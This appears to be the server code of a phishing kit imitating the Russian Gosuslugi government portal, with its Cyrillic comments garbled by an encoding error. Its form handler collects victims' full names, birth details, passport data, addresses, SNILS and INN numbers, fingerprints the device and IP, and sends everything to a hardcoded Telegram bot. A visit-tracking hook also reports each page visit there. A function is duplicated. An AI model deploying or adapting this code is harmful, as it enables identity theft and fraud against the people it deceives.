from datetime import datetime

import requests
from flask import Flask, render_template, send_from_directory, request, jsonify
from user_agents import parse


app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('templates', 'test.htm')

@app.route('/setup/')
def setup():
    return render_template('setup.html')

@app.route('/profile/personal/id-doc')
def id_doc():
    return send_from_directory('templates', 'pass_data.htm')


# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
TELEGRAM_CHAT_ID = "-1002557822121"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"


def parse_user_agent(user_agent_str):
    """–ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º User-Agent –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏"""
    if not user_agent_str:
        return {}

    ua = parse(user_agent_str)
    return {
        'browser': f"{ua.browser.family} {ua.browser.version_string}",
        'os': f"{ua.os.family} {ua.os.version_string}",
        'device': f"{ua.device.family}",
        'is_mobile': ua.is_mobile,
        'is_tablet': ua.is_tablet,
        'is_pc': ua.is_pc,
        'is_bot': ua.is_bot
    }


def get_client_info(request):
    """–°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–ª–∏–µ–Ω—Ç–µ"""
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in ip:
            ip = ip.split(',')[0].strip()

        user_agent = request.headers.get('User-Agent')
        ua_info = parse_user_agent(user_agent)

        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "network": {
                "ip": ip,
                "user_agent": user_agent,
                "accept_language": request.headers.get('Accept-Language'),
                "referrer": request.headers.get('Referer')
            },
            "device": {
                **ua_info,
                "screen_resolution": request.headers.get('X-Screen-Resolution'),
                "timezone": request.headers.get('X-Timezone'),
                "device_id": request.headers.get('X-Device-ID')
            }
        }
    except Exception as e:
        return {"error": str(e)}


def format_telegram_message(form_data, client_info):
    """–§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—Ä–∞—Å–∏–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram"""
    message = "üöÄ <b>–ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ —Å —Ñ–æ—Ä–º—ã –ì–æ—Å—É—Å–ª—É–≥</b>\n\n"

    # –°–µ–∫—Ü–∏—è –ª–∏—á–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    message += "üë§ <b>–õ–∏—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:</b>\n"
    message += f"  ‚Ä¢ –§–∞–º–∏–ª–∏—è: {form_data.get('lastName', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ò–º—è: {form_data.get('firstName', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –û—Ç—á–µ—Å—Ç–≤–æ: {form_data.get('middleName', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –î–∞—Ç–∞ —Ä–æ–∂–¥–µ–Ω–∏—è: {form_data.get('birthDate', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ú–µ—Å—Ç–æ —Ä–æ–∂–¥–µ–Ω–∏—è: {form_data.get('birthPlace', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n\n"

    # –°–µ–∫—Ü–∏—è –ø–∞—Å–ø–æ—Ä—Ç–∞
    message += "üìò <b>–ü–∞—Å–ø–æ—Ä—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:</b>\n"
    message += f"  ‚Ä¢ –ù–æ–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞: {form_data.get('passportNumber', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ö–µ–º –≤—ã–¥–∞–Ω: {form_data.get('passportIssued', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ö–æ–¥ –ø–æ–¥—Ä–∞–∑–¥–µ–ª–µ–Ω–∏—è: {form_data.get('passportCode', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –î–∞—Ç–∞ –≤—ã–¥–∞—á–∏: {form_data.get('passportDate', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n\n"

    # –°–µ–∫—Ü–∏—è –∞–¥—Ä–µ—Å–∞
    message += "üè† <b>–ê–¥—Ä–µ—Å–∞:</b>\n"
    message += f"  ‚Ä¢ –ê–¥—Ä–µ—Å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: {form_data.get('registrationAddress', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ê–¥—Ä–µ—Å –ø—Ä–æ–∂–∏–≤–∞–Ω–∏—è: {form_data.get('livingAddress', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n\n"

    # –°–µ–∫—Ü–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
    message += "üìÑ <b>–î–æ–∫—É–º–µ–Ω—Ç—ã:</b>\n"
    message += f"  ‚Ä¢ –°–ù–ò–õ–°: {form_data.get('snilsNumber', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n"
    message += f"  ‚Ä¢ –ò–ù–ù: {form_data.get('innNumber', '–ù–µ —É–∫–∞–∑–∞–Ω–æ')}\n\n"

    # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
    message += "üì± <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n"
    message += f"  ‚Ä¢ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {client_info['device'].get('device', '')} "
    message += f"({'–ú–æ–±–∏–ª—å–Ω–æ–µ' if client_info['device'].get('is_mobile') else '–î–µ—Å–∫—Ç–æ–ø'})\n"
    message += f"  ‚Ä¢ –û–°: {client_info['device'].get('os', '')}\n"
    message += f"  ‚Ä¢ –ë—Ä–∞—É–∑–µ—Ä: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  ‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {client_info['device']['screen_resolution']}\n"
    message += f"  ‚Ä¢ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: {client_info['device'].get('timezone', '')}\n"
    message += f"  ‚Ä¢ IP: {client_info['network'].get('ip', '')}\n"
    message += f"  ‚Ä¢ –í—Ä–µ–º—è: {client_info['timestamp']}\n"

    return message


def format_visit_message(client_info, page):
    """–§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
    message = "üëÄ <b>–ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å –Ω–∞ —Å–∞–π—Ç–µ</b>\n\n"
    message += f"üìÑ <b>–°—Ç—Ä–∞–Ω–∏—Ü–∞:</b> {page}\n\n"

    message += "üì± <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</b>\n"
    message += f"  ‚Ä¢ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {client_info['device'].get('device', '')} "
    message += f"({'–ú–æ–±–∏–ª—å–Ω–æ–µ' if client_info['device'].get('is_mobile') else '–î–µ—Å–∫—Ç–æ–ø'})\n"
    message += f"  ‚Ä¢ –û–°: {client_info['device'].get('os', '')}\n"
    message += f"  ‚Ä¢ –ë—Ä–∞—É–∑–µ—Ä: {client_info['device'].get('browser', '')}\n"
    if 'screen_resolution' in client_info['device']:
        message += f"  ‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {client_info['device']['screen_resolution']}\n"
    message += f"  ‚Ä¢ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: {client_info['device'].get('timezone', '')}\n"
    message += f"  ‚Ä¢ IP: {client_info['network'].get('ip', '')}\n"
    message += f"  ‚Ä¢ –Ø–∑—ã–∫: {client_info['network'].get('accept_language', '')}\n"
    message += f"  ‚Ä¢ –†–µ—Ñ–µ—Ä–µ—Ä: {client_info['network'].get('referrer', '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥')}\n"
    message += f"  ‚Ä¢ –í—Ä–µ–º—è: {client_info['timestamp']}\n"

    return message


def send_to_telegram(message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
        return False


@app.before_request
def track_visits():
    """–û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –ø–æ—Å–µ—â–µ–Ω–∏—è –æ—Å–Ω–æ–≤–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü"""
    if request.path in ['/', '/setup/', '/profile/personal/id-doc']:
        client_info = get_client_info(request)
        message = format_visit_message(client_info, request.path)
        send_to_telegram(message)


def send_to_telegram(message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram"""
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
        return False


@app.route('/api/submit-form', methods=['POST'])
def submit_form():
    try:
        # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ñ–æ—Ä–º—ã
        form_data = request.json

        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        client_info = get_client_info(request)

        # –§–æ—Ä–º–∏—Ä—É–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        message = format_telegram_message(form_data, client_info)
        if send_to_telegram(message):
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route("/mobile")
def mobile():
    return render_template("pass_mobile.html")

@app.route("/mobile/details")
def mobile_details():
    return render_template("pass_mobile_detail.html")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)